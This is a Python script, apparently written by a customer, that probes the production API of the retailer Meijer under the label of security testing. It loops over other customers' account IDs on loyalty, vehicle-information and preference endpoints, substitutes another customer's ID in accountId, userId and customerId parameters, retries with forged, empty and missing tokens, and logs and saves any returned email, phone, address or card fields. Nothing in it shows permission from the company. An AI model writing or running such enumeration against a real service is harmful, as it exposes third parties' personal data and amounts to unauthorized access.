#!/usr/bin/env python3
"""
Security Testing Script for Meijer API

This script tests for potential security vulnerabilities including:
- Account ID enumeration
- Information disclosure
- Authorization bypasses
- Parameter manipulation
"""

import json
import requests
import time
from typing import Dict, Any, Optional
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class MeijerSecurityTester:
    """Security tester for Meijer API endpoints."""
    
    def __init__(self, access_token: str):
        self.access_token = access_token
        self.api_base = "https://api.meijer.com"
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {access_token}",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; One Build/QQ3A.200705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 (Mobile; afma-sdk-a-v251815999.244410000.1)",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
        })
    
    def test_account_enumeration(self, start_id: int = 13266590, end_id: int = 13266600):
        """Test for account ID enumeration vulnerabilities."""
        logger.info("🔍 Testing account ID enumeration...")
        
        vulnerable_endpoints = [
            "/loyalty/accounts/accounts/getAccount",
            "/loyalty/accounts/getVehicleInformation",
            "/loyalty/accounts/preferences/getCustomerPreferences",
            "/s/settings/{account_id}/v1/mobile"
        ]
        
        results = {}
        
        for endpoint_template in vulnerable_endpoints:
            logger.info(f"Testing endpoint: {endpoint_template}")
            endpoint_results = []
            
            for account_id in range(start_id, end_id + 1):
                try:
                    # Replace placeholder in endpoint
                    endpoint = endpoint_template.replace("{account_id}", str(account_id))
                    url = f"{self.api_base}{endpoint}"
                    
                    response = self.session.get(url)
                    
                    if response.status_code == 200:
                        data = response.json()
                        # Check if we got meaningful data
                        if data and isinstance(data, dict) and len(data) > 0:
                            logger.warning(f"⚠️  POTENTIAL VULNERABILITY: Got data for account {account_id}")
                            logger.warning(f"   Endpoint: {endpoint}")
                            logger.warning(f"   Response: {json.dumps(data, indent=2)[:500]}...")
                            
                            endpoint_results.append({
                                "account_id": account_id,
                                "status_code": response.status_code,
                                "has_data": True,
                                "data_sample": str(data)[:200]
                            })
                        else:
                            endpoint_results.append({
                                "account_id": account_id,
                                "status_code": response.status_code,
                                "has_data": False
                            })
                    else:
                        endpoint_results.append({
                            "account_id": account_id,
                            "status_code": response.status_code,
                            "has_data": False
                        })
                    
                    # Rate limiting
                    time.sleep(0.1)
                    
                except Exception as e:
                    logger.error(f"Error testing account {account_id}: {e}")
                    endpoint_results.append({
                        "account_id": account_id,
                        "error": str(e)
                    })
            
            results[endpoint_template] = endpoint_results
        
        return results
    
    def test_parameter_manipulation(self):
        """Test for parameter manipulation vulnerabilities."""
        logger.info("🔍 Testing parameter manipulation...")
        
        # Test with different account IDs in various parameters
        test_cases = [
            {"accountId": 13266596},  # Your account
            {"accountId": 13266597},  # Different account
            {"accountId": 99999999},  # Non-existent account
            {"userId": 13266596},
            {"userId": 13266597},
            {"customerId": 13266596},
            {"customerId": 13266597},
        ]
        
        results = {}
        
        for test_case in test_cases:
            logger.info(f"Testing with parameters: {test_case}")
            
            # Test different endpoints
            endpoints_to_test = [
                "/loyalty/accounts/accounts/getAccount",
                "/loyalty/accounts/getVehicleInformation",
                "/loyalty/accounts/preferences/getCustomerPreferences"
            ]
            
            for endpoint in endpoints_to_test:
                try:
                    url = f"{self.api_base}{endpoint}"
                    response = self.session.get(url, params=test_case)
                    
                    if response.status_code == 200:
                        data = response.json()
                        if data and isinstance(data, dict) and len(data) > 0:
                            logger.warning(f"⚠️  POTENTIAL VULNERABILITY: Got data with params {test_case}")
                            logger.warning(f"   Endpoint: {endpoint}")
                            logger.warning(f"   Response: {json.dumps(data, indent=2)[:500]}...")
                    
                    results[f"{endpoint}_{test_case}"] = {
                        "status_code": response.status_code,
                        "has_data": bool(data and isinstance(data, dict) and len(data) > 0)
                    }
                    
                except Exception as e:
                    logger.error(f"Error testing {endpoint} with {test_case}: {e}")
                    results[f"{endpoint}_{test_case}"] = {"error": str(e)}
                
                time.sleep(0.1)
        
        return results
    
    def test_authorization_bypass(self):
        """Test for authorization bypass vulnerabilities."""
        logger.info("🔍 Testing authorization bypass...")
        
        # Test if we can access other users' data by manipulating headers or tokens
        results = {}
        
        # Test with modified token (remove last character)
        modified_token = self.access_token[:-1] + "X"
        self.session.headers["Authorization"] = f"Bearer {modified_token}"
        
        try:
            response = self.session.get(f"{self.api_base}/loyalty/accounts/accounts/getAccount")
            results["modified_token"] = {
                "status_code": response.status_code,
                "still_works": response.status_code == 200
            }
        except Exception as e:
            results["modified_token"] = {"error": str(e)}
        
        # Test with empty token
        self.session.headers["Authorization"] = "Bearer "
        try:
            response = self.session.get(f"{self.api_base}/loyalty/accounts/accounts/getAccount")
            results["empty_token"] = {
                "status_code": response.status_code,
                "still_works": response.status_code == 200
            }
        except Exception as e:
            results["empty_token"] = {"error": str(e)}
        
        # Test with no authorization header
        del self.session.headers["Authorization"]
        try:
            response = self.session.get(f"{self.api_base}/loyalty/accounts/accounts/getAccount")
            results["no_auth"] = {
                "status_code": response.status_code,
                "still_works": response.status_code == 200
            }
        except Exception as e:
            results["no_auth"] = {"error": str(e)}
        
        # Restore original token
        self.session.headers["Authorization"] = f"Bearer {self.access_token}"
        
        return results
    
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities."""
        logger.info("🔍 Testing information disclosure...")
        
        # Test common endpoints that might leak information
        test_endpoints = [
            "/loyalty/accounts/accounts/getAccount",
            "/loyalty/accounts/getVehicleInformation",
            "/loyalty/accounts/preferences/getCustomerPreferences",
            "/s/settings/13266596/v1/mobile"
        ]
        
        results = {}
        
        for endpoint in test_endpoints:
            try:
                url = f"{self.api_base}{endpoint}"
                response = self.session.get(url)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Check for sensitive information
                    sensitive_fields = [
                        "email", "phone", "address", "ssn", "credit_card", 
                        "password", "token", "secret", "key", "id", "account"
                    ]
                    
                    sensitive_data_found = []
                    for field in sensitive_fields:
                        if self._contains_sensitive_data(data, field):
                            sensitive_data_found.append(field)
                    
                    results[endpoint] = {
                        "status_code": response.status_code,
                        "sensitive_fields_found": sensitive_data_found,
                        "data_size": len(str(data)),
                        "sample_data": str(data)[:500]
                    }
                    
                    if sensitive_data_found:
                        logger.warning(f"⚠️  SENSITIVE DATA DISCLOSURE: {endpoint}")
                        logger.warning(f"   Sensitive fields: {sensitive_data_found}")
                else:
                    results[endpoint] = {
                        "status_code": response.status_code,
                        "error": f"HTTP {response.status_code}"
                    }
                
            except Exception as e:
                logger.error(f"Error testing {endpoint}: {e}")
                results[endpoint] = {"error": str(e)}
            
            time.sleep(0.1)
        
        return results
    
    def _contains_sensitive_data(self, data: Any, field_name: str) -> bool:
        """Check if data contains sensitive information."""
        if isinstance(data, dict):
            for key, value in data.items():
                if field_name.lower() in key.lower():
                    return True
                if self._contains_sensitive_data(value, field_name):
                    return True
        elif isinstance(data, list):
            for item in data:
                if self._contains_sensitive_data(item, field_name):
                    return True
        return False
    
    def run_all_tests(self):
        """Run all security tests."""
        logger.info("🚀 Starting comprehensive security testing...")
        
        results = {
            "account_enumeration": self.test_account_enumeration(),
            "parameter_manipulation": self.test_parameter_manipulation(),
            "authorization_bypass": self.test_authorization_bypass(),
            "information_disclosure": self.test_information_disclosure()
        }
        
        # Save results
        with open("security_test_results.json", "w") as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info("✅ Security testing completed. Results saved to security_test_results.json")
        return results

def main():
    """Main function to run security tests."""
    print("🔒 Meijer API Security Testing Tool")
    print("=" * 50)
    
    # Get access token from user
    access_token = input("Enter your Meijer access token: ").strip()
    
    if not access_token:
        print("❌ No access token provided")
        return
    
    # Create tester and run tests
    tester = MeijerSecurityTester(access_token)
    results = tester.run_all_tests()
    
    # Print summary
    print("\n📊 Security Test Summary:")
    print("=" * 30)
    
    for test_name, test_results in results.items():
        print(f"\n{test_name.upper()}:")
        if isinstance(test_results, dict):
            for key, value in test_results.items():
                if isinstance(value, list):
                    print(f"  {key}: {len(value)} results")
                else:
                    print(f"  {key}: {value}")
        else:
            print(f"  Results: {test_results}")

if __name__ == "__main__":
    main()

